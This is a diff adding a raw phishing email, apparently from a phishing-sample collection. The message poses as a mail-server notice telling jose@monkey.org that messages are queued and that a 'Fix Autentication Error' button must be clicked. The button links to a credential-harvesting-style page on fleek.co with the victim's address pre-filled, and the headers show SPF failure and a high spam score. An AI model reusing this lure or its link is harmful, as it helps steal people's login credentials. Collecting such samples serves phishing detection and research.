@@ -1,0 +1,124 @@
+Return-Path: admin@admesy.com
+Delivered-To: jose@monkey.org
+X-FDA: 80087980224.22.4E5C48F
+Received: from conmacchio.com (unknown [45.67.229.173])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id 6CAE518BECEA1
+	for <jose@monkey.org>; Wed,  2 Nov 2022 09:29:51 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=artlanitis-invest.com; s=default; h=From:To:Subject:
+	MIME-Version:Content-Type:Content-Transfer-Encoding; bh=jIxCNGkU
+	/A+NJMAQzBssHHkvyNU=; b=OpMq45eMb4hHtnEyMIb4G20alemO/ghC5RvBTaX4
+	y2gx8ZLCSHPwHklBCzAx22DBwOjDeRnRiRnReHx7BF/HVTXTpXCAVlC/8F2B19zN
+	00ZzCtP72T4tfNo7BZPxHW9CMItopn7kwSLA/iQFAmKLchbUlPe6FybGuXrkvsEf
+	1fM=
+From: Message Center monkey.org  <notify-jose@conmacchio.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?SW5jb21pbmcgTWFpbCDinIkgIEVycm9y?=
+Date: 2 Nov 2022 02:29:50 -0700
+Message-ID: <20221102022950.ED74F758F9A071D8@conmacchio.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+ARC-Authentication-Results: i=1;
+	imf13.b.hostedemail.com;
+	dkim=temperror ("DNS error when getting key") header.d=artlanitis-invest.com header.s=default header.b=OpMq45eM;
+	spf=fail (imf13.b.hostedemail.com: domain of admin@admesy.com does not designate 45.67.229.173 as permitted sender) smtp.mailfrom=admin@admesy.com;
+	dmarc=temperror reason="server fail" header.from=conmacchio.com (policy=temperror)
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1667381391;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=nRV1GlSKLqu9a7OL8+B0p1+SA+KqVI7SKtv059oE5tg=;
+	b=dLRFCQ9M/E+h90xAlXE0PMNojlX5rYPXWKUMEzH9nM9yFNLlRA9owkiOopRw1rwv/1zWJJ
+	wHqqYuib/IR51O6fLPPZcfL8ai4y6Z3EHI/SUyiADKAP+wgxBAIDc0kIqM54qCxdm3sBM8
+	Rq/qjcI8aMeoekr7V+s2wLKx3Bowp3A=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1667381391; a=rsa-sha256;
+	cv=none;
+	b=ifpZr75/SqU2fkRIMK3ovPk1u0+KgjnSkFMLAI4D3pyKvolChc7SG7gGsdWfY5fr3W9pXl
+	PqQqdFeuvLsxOGFG951RxKjeeS1d2993yeq9EpJYPZf8BwSDSPyUc3hr7osn58ddtSFtY9
+	Ukcuz54003Yu80mR3QNhNbUE5ucQjME=
+Authentication-Results: imf13.b.hostedemail.com;
+	dkim=temperror ("DNS error when getting key") header.d=artlanitis-invest.com header.s=default header.b=OpMq45eM;
+	spf=fail (imf13.b.hostedemail.com: domain of admin@admesy.com does not designate 45.67.229.173 as permitted sender) smtp.mailfrom=admin@admesy.com;
+	dmarc=temperror reason="server fail" header.from=conmacchio.com (policy=temperror)
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 6CAE518BECEA1
+X-Spam-Status: Yes, score=15.70
+X-Stat-Signature: y4acgetrtynjh9xqwbmzjqwasa119qm3
+X-Rspam-User: 
+X-HE-Tag: 1667381391-698001
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 186
+
+<!DOCTYPE html><html>
+
+<html><head>
+
+    <meta http-equiv=3D"content-type" content=3D"text/html; charset=3D">
+    <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19699">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+  <body>
+    <p><br>
+    </p>
+    <div style=3D'text-align: left; color: rgb(29, 34, 40); text-transform:=
+ none; text-indent: 0px; letter-spacing: normal; font-family: "Helvetica Ne=
+ue", Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: =
+2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-st=
+yle: initial; text-decoration-color: initial;'=20
+dir=3D"ltr"><span>
+        <div style=3D'text-align: left; color: rgb(29, 34, 40); text-transf=
+orm: none; text-indent: 0px; letter-spacing: normal; font-family: "Helvetic=
+a Neue", Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
+ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
+; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
+n-style: initial; text-decoration-color: initial;'=20
+dir=3D"ltr">
+          <span style=3D"color: rgb(38, 40, 42); font-family: Calibri, sans=
+-serif, serif;">Attention:<span> </span><span style=3D"color: rgb(38, 73, 2=
+17); text-decoration: underline;">jose@monkey.org</span></span><br>
+        </div>
+        <div style=3D'text-align: left; color: rgb(29, 34, 40); text-transf=
+orm: none; text-indent: 0px; letter-spacing: normal; font-family: "Helvetic=
+a Neue", Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
+ws: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal=
+; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoratio=
+n-style: initial; text-decoration-color: initial;'=20
+dir=3D"ltr">
+          <div style=3D"padding-top: 0px; border-top-color: currentColor; b=
+order-top-width: 0px; border-top-style: none;">
+            <p style=3D"color: rgb(38, 40, 42); font-family: Calibri, sans-=
+serif, serif; font-size: 16px;">Some incoming
+              messages are queued in the server due to error.<br>
+              <br>
+              Your sessions needs to be re-authenticated in the browser.<br=
+>
+              <br>
+              Use the button below to fix error<br>
+              <br>
+            </p>
+            <span>
+              <a style=3D"background: 0% 50% rgb(220, 60, 0); font: 15px/no=
+rmal monospace; padding: 15px; width: 349px; height: 16px; text-align: cent=
+er; color: white; display: block; font-size-adjust: none; font-stretch: nor=
+mal;" href=3D"https://storageapi.fleek.co/a7d5ab51-9d31-49db-8ca7-262358a0d=
+ca9-bucket/inshajsujutcdrsexdtfgvyubhbygvffokijumkj1/Index.html#jose@monkey=
+=2Eorg" target=3D"_self" rel=3D"noreferrer" moz-do-not-send=3D"true">Fix Au=
+tentication Error</a></span></div>
+        </div>
+        <br class=3D"Apple-interchange-newline">
+      </span></div>
+    <p><br class=3D"Apple-interchange-newline">
+      &nbsp;</p>
+=20=20
+
+</body></html>
+
